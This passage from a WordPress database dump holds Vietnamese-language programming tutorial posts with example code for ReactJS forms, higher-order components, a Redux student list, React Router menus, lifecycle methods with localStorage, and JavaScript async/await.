htmlFor=\"gender0\">Nam</label>\r\n\r\n                        <input type=\"radio\" id=\"gender1\" name=\"gender\"\r\n                            value=\"1\"\r\n                            onChange={this.handleChangeInput}\r\n                            checked={this.state.gender == \"1\"} />\r\n                        <label htmlFor=\"gender1\">Nữ</label><br /><br />\r\n\r\n                        <input type=\"checkbox\" name=\"languages\" id=\"language0\"\r\n                            value=\"Javascript\"\r\n                            onChange={this.handleChangeCheckbox}\r\n                            checked={this.state.languages.includes(\"Javascript\")} />\r\n                        <label htmlFor=\"language0\">Javascript</label><br />\r\n\r\n                        <input type=\"checkbox\" name=\"languages\" id=\"language1\"\r\n                            value=\"PHP\"\r\n                            onChange={this.handleChangeCheckbox}\r\n                            checked={this.state.languages.includes(\"PHP\")} />\r\n                        <label htmlFor=\"language1\">PHP</label><br />\r\n\r\n                        <input type=\"checkbox\" name=\"languages\" id=\"language2\"\r\n                            value=\"C++\"\r\n                            onChange={this.handleChangeCheckbox}\r\n                            checked={this.state.languages.includes(\"C++\")} />\r\n                        <label htmlFor=\"language2\">C++</label><br />\r\n\r\n                        <p>Username: <span>{this.state.username}</span></p>\r\n                        <p>Gender: <span>{this.state.gender}</span></p>\r\n                        <p>Languages: <span>{this.state.languages.join(\", \")}</span></p>\r\n                    </div>\r\n                );\r\n            }\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'root\')\r\n        );\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'ReactJS – Form', '', 'publish', 'open', 'open', '', 'reactjs-form', '', '', '2022-05-20 14:08:24', '2022-05-20 07:08:24', '', 0, 'https://duycode.com/?p=1346', 0, 'post', '', 0),
(1348, 1, '2021-05-01 09:00:07', '2021-05-01 02:00:07', '<h2>1. Đặt vấn đề</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\" />\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useEffect } = React\r\n\r\n        // Hình chữ nhật và hình tròn có logic về opacity khá giống nhau\r\n        const Rectangle = () => {\r\n            const [opacity, setOpacity] = useState(1);\r\n            return (\r\n                <div\r\n                    style={{ opacity }}\r\n                    onMouseEnter={() => setOpacity(0.5)}\r\n                    onMouseLeave={() => setOpacity(1)}\r\n                >\r\n                    <div style={{ width: 200, height: 100, backgroundColor: \"green\" }}></div>\r\n                </div>\r\n            )\r\n        }\r\n\r\n        // Hình chữ nhật và hình tròn có logic về opacity khá giống nhau\r\n        const Circle = ({ url }) => {\r\n            const [opacity, setOpacity] = useState(1);\r\n            return (\r\n                <div\r\n                    style={{ opacity }}\r\n                    onMouseEnter={() => setOpacity(0.5)}\r\n                    onMouseLeave={() => setOpacity(1)}\r\n                >\r\n                    <div style={{ width: 100, height: 100, backgroundColor: \"violet\", borderRadius: \"50%\" }}></div>\r\n                </div>\r\n            )\r\n        }\r\n\r\n\r\n        const App = () => {\r\n            return (\r\n                <div>\r\n                    <Circle />\r\n                    <Rectangle />\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(<App />, document.getElementById(\'root\'))\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. Dùng HOC để giải quyết các logic trùng lặp</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\" />\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useEffect } = React\r\n\r\n        // Tạo 1 HOC nhận vào một Component và trả về một Component\r\n        // HOC này dự định sẽ dùng chung cho mọi Component có logic di chuột vào làm mờ hình\r\n        const withHoverOpacity = (CustomComponent) => () => { \r\n            const [opacity, setOpacity] = useState(1);\r\n            return (\r\n                <div\r\n                    style={{ opacity }}\r\n                    onMouseEnter={() => setOpacity(0.5)}\r\n                    onMouseLeave={() => setOpacity(1)}\r\n                >\r\n                    <CustomComponent/>\r\n                </div>\r\n            )\r\n        }\r\n\r\n        const Rectangle = () => <div style={{ width: 200, height: 100, backgroundColor: \"green\" }}></div>\r\n        const Circle = () => <div style={{ width: 100, height: 100, backgroundColor: \"violet\", borderRadius: \"50%\" }}></div>\r\n    \r\n        // Tạo thêm 1 component cha từ HOC bọc lại Component ban đầu\r\n        const RectangleWithHover = withHoverOpacity(Rectangle)\r\n        const CircleWithHover = withHoverOpacity(Circle)\r\n\r\n        const App = () => {\r\n            return (\r\n                <div>\r\n                    <RectangleWithHover />\r\n                    <CircleWithHover />\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(<App />, document.getElementById(\'root\'))\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'ReactJS – 9. Higher-Order Components (HOC)', '', 'publish', 'open', 'open', '', 'reactjs-9-higher-order-components-hoc', '', '', '2022-05-20 18:00:58', '2022-05-20 11:00:58', '', 0, 'https://duycode.com/?p=1348', 0, 'post', '', 0),
(1357, 1, '2021-06-29 01:00:43', '2021-06-28 18:00:43', '<img src=\"https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif\" alt=\"Redux\" />\n<h3>Các kiến thức trong Project này gồm có:</h3>\n- Sử dụng Class: props, state, event\n- Redux: Reducers, actions, container components\n- Storage\n- Protypes\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>ReactJS</title>\n    <style>\n        table {\n            border-collapse: collapse;\n        }\n\n        th, td {\n            padding: 0 0.5rem;\n            border: 1px solid black;\n        }\n    </style>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js\"></script>\n    <script src=\"https://unpkg.com/prop-types@15.6/prop-types.js\"></script>\n    <!-- =========== src/utils.js =========== -->\n    <script>\n        class Uuid {\n            s4() {\n                return Math.floor((1 + Math.random()) * 0x10000)\n                    .toString(16)\n                    .substring(1);\n            }\n            s16() {\n                return this.s4() + this.s4() + this.s4() + this.s4();\n            }\n        }\n        let uuid = new Uuid();\n    </script>\n\n    <!-- =========== constants/ActionTypes.js =========== -->\n    <script>\n        //Các hằng số types ==> sử dụng cho các actions\n        const types = {\n            SAVE_STUDENT: \'SAVE_STUDENT\',\n            DELETE_STUDENT: \'DELETE_STUDENT\',\n        };\n    </script>\n\n    <!-- =========== reducers/listStudent_reducer.js =========== -->\n    <script>\n        //Trong 1 Reducer bao gồm 2 thành phần: state và reducer\n        //State là nơi chứa dữ liệu\n        //Reducer là nơi xử lý các action (khi bị dispatch)\n        //---- listStudent_state có thể khởi tạo mặc định hoặc lấy trên localStorage\n        let listStudent_state = JSON.parse(localStorage.getItem(\'listStudent\')) || [];\n        let listStudent_reducer = (state = listStudent_state, action) => {\n            //Khi làm việc với state, cần return ra 1 state mới, \n            //Tốt nhất nên copystate cũ luôn\n            let new_state = [...state]\n            switch (action.type) {\n                case types.SAVE_STUDENT:\n                    if (!action.student.id) {\n                        let new_student = {\n                            id: uuid.s16(),\n                            username: action.student.username,\n                            email: action.student.email,\n                        };\n                        new_state.push(new_student);\n                    } else {\n                        let find_student = new_state.find((item) => item.id == action.student.id);\n                        find_student.username = action.student.username;\n                        find_student.email = action.student.email;\n                    }\n                    localStorage.setItem(\'listStudent\', JSON.stringify(new_state));\n                    return new_state;\n\n                case types.DELETE_STUDENT:\n                    new_state = state.filter((item) => item.id != action.id);\n                    localStorage.setItem(\'listStudent\', JSON.stringify(new_state));\n                    return new_state;\n            }\n            return new_state;\n        };\n    </script>\n\n    <!-- =========== reducers/listproduct_Reducer.js =========== -->\n\n    <!-- =========== reducers/index.js =========== -->\n    <script>\n        //Combine nhiều Reducers lại để tạo ra 1 Reducer duy nhất\n        let rootReducer = Redux.combineReducers({\n            listStudent: listStudent_reducer,\n            //product: productReducer,\n        });\n    </script>\n\n    <!-- =========== actions/index.js =========== -->\n    <script>\n        //Các action khi được dispatch ==> sẽ trả về object actions tương ứng\n        let action_saveStudent = (student) => {\n            return {\n                type: types.SAVE_STUDENT,\n                student: student,\n            };\n        };\n        let action_deleteStudent = (id) => {\n            return {\n                type: types.DELETE_STUDENT,\n                id: id,\n            };\n        };\n\n    </script>\n\n    <!-- =========== components/App.js =========== -->\n    <script type=\"text/babel\">\n        class App extends React.Component {\n            constructor(props) {\n                super(props);\n                this.state = {\n                    txtFilterName: \'\',\n                    student: {},\n                };\n            }\n\n            updateState_student = (e) => {\n                let updateStudent = this.state.student;\n                updateStudent[e.target.name] = e.target.value;\n                this.setState({\n                    student: updateStudent,\n                });\n            };\n\n            onFilterStudent = (e) => {\n                e.preventDefault();\n                this.setState({\n                    txtFilterName: e.target.value,\n                });\n            };\n\n            onNewStudent = (e) => {\n                e.preventDefault();\n                this.setState({\n                    student: {},\n                });\n            };\n            onEditStudent = (e, student) => {\n                e.preventDefault();\n                this.setState({\n                    student: { ...student },\n                });\n            };\n            onSaveStudent = (e) => {\n                e.preventDefault();\n                if (!this.state.student.username || !this.state.student.email) return;\n                this.props.dispatch_saveStudent(this.state.student);\n                //reset state sau khi save xong\n                this.setState({\n                    student: {},\n                });\n            };\n\n            onDeleteStudent = (e, id) => {\n                e.preventDefault();\n                this.props.dispatch_deleteStudent(id);\n            };\n\n            render() {\n                // console.log(this.props);\n                let filter = this.state.txtFilterName;\n                let tr_listStudent = this.props.listStudent\n                    .filter((item) => item.username.includes(filter))\n                    .map((item, index) => {\n                        return (\n                            <tr key={item.id}>\n                                <td>{index}</td>\n                                <td>{item.username}</td>\n                                <td>{item.email}</td>\n                                <td>\n                                    <button onClick={(e) => this.onEditStudent(e, item)}>Sửa</button>\n                                    <button onClick={(e) => this.onDeleteStudent(e, item.id)}>Xóa</button>\n                                </td>\n                            </tr>\n                        );\n                    });\n\n                return (\n                    <div>\n                        <button onClick={this.onNewStudent}>New Student</button>\n                        <br />\n                        <input type=\"text\" placeholder=\"username\" name=\"username\"\n                            value={this.state.student.username}\n                            onChange={this.updateState_student}\n                        />\n                        <br />\n                        <input type=\"text\" placeholder=\"email\" name=\"email\"\n                            value={this.state.student.email}\n                            onChange={this.updateState_student}\n                        />\n                        <br />\n                        <button onClick={this.onSaveStudent}>\n                            {this.state.student.id ? \'Update Student\' : \'Add Student\'}\n                        </button>\n                        <br />\n                        <br />\n                        <input type=\"text\" placeholder=\"Search ...\" name=\"txtFilterName\"\n                            value={this.state.txtFilterName}\n                            onChange={this.onFilterStudent}\n                        />\n                        <table>\n                            <thead>\n                                <tr>\n                                    <th>#</th>\n                                    <th>Username</th>\n                                    <th>Email</th>\n                                    <th>Action</th>\n                                </tr>\n                            </thead>\n                            <tbody>{tr_listStudent}</tbody>\n                        </table>\n                    </div>\n                );\n            }\n        }\n    </script>\n\n    <!-- =========== container/AppContainer.js =========== -->\n    <script type=\"text/babel\">\n        //Dùng riêng 1 class Container chỉ để mục đích hứng các props từ Redux\n        //Các props hứng được từ Redux lại chuyển tiếp về Component\n        class AppContainer extends React.Component {\n            render() {\n                return (\n                    <App\n                        listStudent={this.props.listStudent}\n                        product={this.props.product}\n                        dispatch_saveStudent={this.props.dispatch_saveStudent}\n                        dispatch_deleteStudent={this.props.dispatch_deleteStudent}\n                    />\n                );\n            }\n        }\n\n        //check dữ liệu nhận từ store (props) bằng propTypes\n        AppContainer.propTypes = {\n            listStudent: PropTypes.arrayOf(\n                PropTypes.shape({\n                    username: PropTypes.string,\n                    email: PropTypes.string,\n                })\n            ).isRequired,\n        };\n\n        //mapStateToProps: chuyển state từ store thành props của component\n        let mapStateToProps_App = (state) => {\n            return {\n                listStudent: state.listStudent,\n                product: state.product,\n            };\n        };\n        //mapDispatchToProps: chuyển action từ store thành props của component\n        let mapDispatchToProps_App = (dispatch, props) => {\n            return {\n                dispatch_saveStudent: (student) => {\n                    dispatch(action_saveStudent(student));\n                },\n                dispatch_deleteStudent: (id) => {\n                    dispatch(action_deleteStudent(id));\n                },\n            };\n        };\n        //connect Component Container với Redux bằng connect\n        let AppConnect = ReactRedux.connect(mapStateToProps_App, mapDispatchToProps_App)(AppContainer);\n    </script>\n\n    <!-- =========== src/store.js =========== -->\n    <script type=\"text/babel\">\n        //Gọi store bằng reducers, cái đoạn lằng nhằng là để sử dụng cho redux chrome extensions\n        //const store = Redux.createStore(rootReducer);\n        const store = Redux.createStore(\n            rootReducer /* preloadedState, */,\n            window.__REDUX_DEVTOOLS_EXTENSION__ && window.__REDUX_DEVTOOLS_EXTENSION__()\n        );\n    </script>\n\n    <!-- =========== src/index.js =========== -->\n    <script type=\"text/babel\">\n        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên\n        const Provider = ReactRedux.Provider;\n        ReactDOM.render(\n            //Lúc này, không còn gọi class App nữa, mà gọi AppContainer là Appconnect\n            <Provider store={store}>\n                <AppConnect />\n            </Provider>,\n            document.getElementById(\'root\')\n        );\n    </script>\n</body>\n\n</html>\n</pre>', 'Demo-CRUD: 1. ListStudent with Redux [ Class ]', '', 'publish', 'open', 'open', '', 'demo-crud-1-liststudent-with-redux-class', '', '', '2021-06-29 01:00:43', '2021-06-28 18:00:43', '', 0, 'https://duycode.com/?p=1357', 0, 'post', '', 0),
(1367, 1, '2021-05-03 02:00:32', '2021-05-02 19:00:32', '<h2>1. Active Menu</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n    <style>\r\n        .link-active {\r\n            background-color: green;\r\n        }\r\n    </style>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-router-dom/5.2.0/react-router-dom.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { HashRouter, Switch, Route, NavLink } = ReactRouterDOM\r\n\r\n        const Home = () => <h1>Home</h1>\r\n        const Product = () => <h1>Product</h1>\r\n        const About = () => <h1>About</h1>\r\n        const NotFound = () => <h1>NotFound</h1>\r\n\r\n        const App = () => (\r\n            <HashRouter>\r\n                <div>\r\n                    <NavLink exact to=\"/\" activeStyle={{ color: \'white\' }} activeClassName=\"link-active\"> Home </NavLink>\r\n                    <NavLink to=\"/product\" activeStyle={{ color: \'white\' }} activeClassName=\"link-active\"> Product </NavLink>\r\n                    <NavLink to=\"/about\" activeStyle={{ color: \'white\' }} activeClassName=\"link-active\"> About </NavLink>\r\n                    <NavLink to=\"/abcxyz\" activeStyle={{ color: \'white\' }} activeClassName=\"link-active\"> abcxyz </NavLink>\r\n                </div>\r\n                <Switch>\r\n                    <Route path=\"/\" exact component={Home} />\r\n                    <Route path=\"/product\" component={Product} />\r\n                    <Route path=\"/about\" component={About} />\r\n                    <Route component={NotFound} />\r\n                </Switch>\r\n            </HashRouter>\r\n        );\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'root\')\r\n        );\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. Custom Menu </h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n    <style>\r\n        .link-active {\r\n            background-color: green;\r\n        }\r\n    </style>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-router-dom/5.2.0/react-router-dom.js\"></script>\r\n\r\n\r\n    <!-- =========== components/.........js =========== -->\r\n    <script type=\"text/babel\">\r\n        const { HashRouter, Switch, Route, NavLink, Link } = ReactRouterDOM\r\n        const Home = () => <h1>Home</h1>\r\n        const Product = () => <h1>Product</h1>\r\n        const About = () => <h1>About</h1>\r\n        const NotFound = () => <h1>NotFound</h1>\r\n\r\n        const App = () => {\r\n            let CustomLink = ({ label, to, activeOnlyWhenExact }) => {\r\n                let match = ReactRouterDOM.useRouteMatch({\r\n                    path: to,\r\n                    exact: activeOnlyWhenExact\r\n                });\r\n\r\n                return (\r\n                    <li className={match ? \"link-active\" : \"\"}>\r\n                        <Link to={to}>{label}</Link>\r\n                    </li>\r\n                );\r\n            }\r\n\r\n            return (\r\n                <HashRouter>\r\n                    <ul>\r\n                        <CustomLink label=\"Home\" to=\"/\" activeOnlyWhenExact={true} />\r\n                        <CustomLink label=\"Product\" to=\"/product\" />\r\n                        <CustomLink label=\"About\" to=\"/about\" />\r\n                        <CustomLink label=\"abcxyz\" to=\"/abcxyz\" />\r\n                    </ul>\r\n                    <Switch>\r\n                        <Route path=\"/\" exact component={Home} />\r\n                        <Route path=\"/product\" component={Product} />\r\n                        <Route path=\"/about\" component={About} />\r\n                        <Route path=\"\" component={NotFound} />\r\n                    </Switch>\r\n                </HashRouter>\r\n            )\r\n        }\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'root\')\r\n        );\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'React-Router: 2. Custom Router', '', 'publish', 'open', 'open', '', 'react-router-2-custom-router', '', '', '2022-05-20 14:23:25', '2022-05-20 07:23:25', '', 0, 'https://duycode.com/?p=1367', 0, 'post', '', 0),
(1373, 1, '2021-05-03 03:00:20', '2021-05-02 20:00:20', '<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n    <style>\r\n        .link-active {\r\n            background-color: green;\r\n        }\r\n    </style>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-router-dom/5.2.0/react-router-dom.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { HashRouter, Switch, Route, NavLink, Link } = ReactRouterDOM\r\n\r\n        const Home = (props) => <p>{JSON.stringify(props, null, \"\\t\")}</p>\r\n        const Product = (props) => <p>{JSON.stringify(props, null, \"\\t\")}</p>\r\n        const Blog = (props) => <p>{JSON.stringify(props, null, \"\\t\")}</p>\r\n        const About = (props) => <p>{JSON.stringify(props, null, \"\\t\")}</p>\r\n        const NotFound = (props) => <h3>Not found</h3>\r\n        const App = () => (\r\n            <HashRouter>\r\n                <div>\r\n                    <Link to=\"/\"> Home </Link>\r\n                    <Link to=\"/Product\"> Product </Link>\r\n                    <Link to=\"/Blog\"> Blog </Link>\r\n                    <Link to=\"/About\"> About </Link>\r\n                    <Link to=\"/404\"> 404 </Link>\r\n                </div>\r\n                <Switch>\r\n                    <Route path=\"/\" exact component={(routes) => <Home routes={routes} number={99}/>} />\r\n                    <Route path=\"/Product\" component={Product} />\r\n                    <Route path=\"/Blog\" component={({ match }) => <Blog match={match} />} />\r\n                    <Route path=\"/About\" component={() => <About />} />\r\n                    <Route path=\"\" component={NotFound} />\r\n                </Switch>\r\n            </HashRouter>\r\n        );\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'root\')\r\n        );\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'React-Router: 3. Custom Component Props', '', 'publish', 'open', 'open', '', 'react-router-3-custom-component-props', '', '', '2022-05-20 14:32:46', '2022-05-20 07:32:46', '', 0, 'https://duycode.com/?p=1373', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(1375, 1, '2021-07-15 04:04:20', '2021-07-14 21:04:20', '<h2>1. LocalStorage</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>ReactJS</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n\n    <script type=\"text/babel\">\n        class App extends React.Component {\n            constructor(props) {\n                super(props);\n                this.state = {\n                    id: 0,\n                    username: \'Loading...\',\n                };\n            }\n\n            //sử dụng setState khi get được localstorage trong componentWillMount()\n            componentDidMount() {\n                if (localStorage && localStorage.getItem(\'username\')) {\n                    this.setState({\n                        username: JSON.parse(localStorage.getItem(\'username\')),\n                    })\n\n                }\n            }\n\n            componentDidUpdate(prevProps, prevState) {\n                if (prevState.username !== this.state.username) {\n                    localStorage.setItem(\'username\', JSON.stringify(this.state.username));\n                }\n            }\n\n            render() {\n                return (\n                    <div>\n                        <input type=\"text\" name=\"username\"\n                            value={this.state.username}\n                            onChange={(e) => { this.setState({ username: e.target.value }) }} />\n                        <h4> - Username: {this.state.username}</h4>\n                    </div>\n                );\n            }\n        }\n\n        ReactDOM.render(<App />, document.getElementById(\'root\'));\n    </script>\n</body>\n\n</html>\n</pre>\n\n<h2>2. getAPI in Lifecycle</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n	<meta charset=\"UTF-8\" />\n	<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n	<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n	<title>ReactJS</title>\n</head>\n\n<body>\n	<div id=\"app\"></div>\n	<script crossorigin src=\"https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react.js\"></script>\n	<script crossorigin src=\"https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react-dom.js\"></script>\n	<script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n\n	<script type=\"text/babel\">\n		class Student extends React.Component {\n			constructor(props) {\n				super(props);\n				this.isComponentMounted = false;\n				this.state = {\n					student: {\n						name: \'Loading...\',\n						email: \'Loading...\',\n					},\n				};\n			}\n\n			componentDidMount() {\n				this.isComponentMounted = true;\n				this.getStudent(1);\n			}\n\n			componentDidUpdate(prevProps, prevState) {\n				if (prevProps.id == this.props.id) return;\n				this.getStudent(this.props.id);\n			}\n\n			componentWillUnmount() {\n				this.isComponentMounted = false;\n			}\n\n			async getStudent(id) {\n				try {\n					let student = await this.api_Student(id);\n					//Khi component bị unmount rồi thì sẽ không setState được nữa\n					if (this.isComponentMounted) {\n						this.setState({\n							student: student,\n						});\n					}\n				} catch (error) {\n					console.log(error);\n				}\n			}\n\n			api_Student(id) {\n				// Mình sẽ giả lập gọi api getStudent bằng hàm setTimeout nhé\n				// Hành động thực tế ở đây là sẽ phải gọi api để lấy thông tin sinh viên theo id nha\n				// Và Sau khi lấy được thông tin thì trả về thông tin sinh viên get được\n				return new Promise((resolve, reject) => {\n					setTimeout(() => {\n						if (1 == 1) {\n							let student = {\n								name: \'John Baker - \' + id,\n								email: \'jhon@gmail.com - \' + id,\n							};\n							return resolve(student);\n						}\n						reject(\"Can\'t get Student\");\n					}, 1000);\n				});\n			}\n\n			render() {\n				return (\n					<div>\n						<p>ID: <strong>{this.props.id}</strong></p>\n						<p>Name: <strong>{this.state.student.name}</strong></p>\n						<p>Email: <strong>{this.state.student.email}</strong></p>\n					</div>\n				);\n			}\n		}\n\n		class App extends React.Component {\n			constructor(props) {\n				super(props);\n				this.state = {id: 0};\n			}\n\n			render() {\n				return (\n					<div>\n						<input type=\"text\" name=\"id\" value={this.state.id}\n							onChange={(e) => {\n								this.setState({ id: e.target.value });\n							}}\n						/>\n						<Student id={this.state.id} />\n					</div>\n				);\n			}\n		}\n\n		ReactDOM.render(<App />, document.getElementById(\'app\'));\n	</script>\n</body>\n</html>\n\n</pre>', 'ReactJS – 4.4. Class: Lifecylce - localStorage và getAPI', '', 'publish', 'open', 'open', '', 'reactjs-4-4-class-lifecylce-localstorage-va-getapi', '', '', '2021-07-15 04:04:20', '2021-07-14 21:04:20', '', 0, 'https://duycode.com/?p=1375', 0, 'post', '', 0),
(1377, 1, '2021-01-02 03:00:07', '2021-01-01 20:00:07', '<h2>1. Async await là gì</h2>\n- Hàm async luôn trả về 1 Promise\n- Await chính là promise.then(res=>...). Kết quả của await chính là res của then trong promise \n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n\n<body>\n    <script>\n        async function async1() {\n            console.log(\"async1 start\")   // 2\n            await async2();\n            console.log(\"async1 end\")     // 6\n        }\n\n        async function async2() {\n            console.log(\"async2\");         // 3\n            return 5\n        }\n\n        console.log(\"script start\")       //.start\n        setTimeout(function () {\n            console.log(\"setTimeout\")     //.end\n        }, 0);\n\n        async1();\n\n        new Promise(function (resolve) {\n            console.log(\"promise1\");      // 4\n            resolve();\n        }).then(function () {\n            console.log(\"promise2\");      // 7\n        })\n\n        console.log(\"script end\")         // 5\n\n    </script>\n</body>\n\n</html>\n</pre>\n\n<h2>Demo sử dụng Asyn await để Get Data</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n	<head>\n		<meta charset=\"UTF-8\" />\n		<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n		<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n		<title>Document</title>\n	</head>\n\n	<body>\n		<h2>Xử lý bất đồng bộ trong ES6</h2>\n		<script>\n			async function getFakeData() {\n				try {\n					let url = \'https://fakestoreapi.com/users?limit=5\';\n					let response = await fetch(url);\n					let responseJSON = await response.json();\n					console.log(responseJSON);\n				} catch (error) {\n					console.log(\'Failed to fetch data. \', error.message);\n				}\n			}\n			let example = getFakeData();\n			console.log(example);\n		</script>\n	</body>\n</html>\n</pre>\n', 'JS Asynchronous: 3. Sử dụng Async await', '', 'publish', 'open', 'open', '', 'js-asynchronous-3-su-dung-async-await', '', '', '2021-01-02 03:00:07', '2021-01-01 20:00:07', '', 0, 'https://duycode.com/?p=1377', 0, 'post', '', 0),
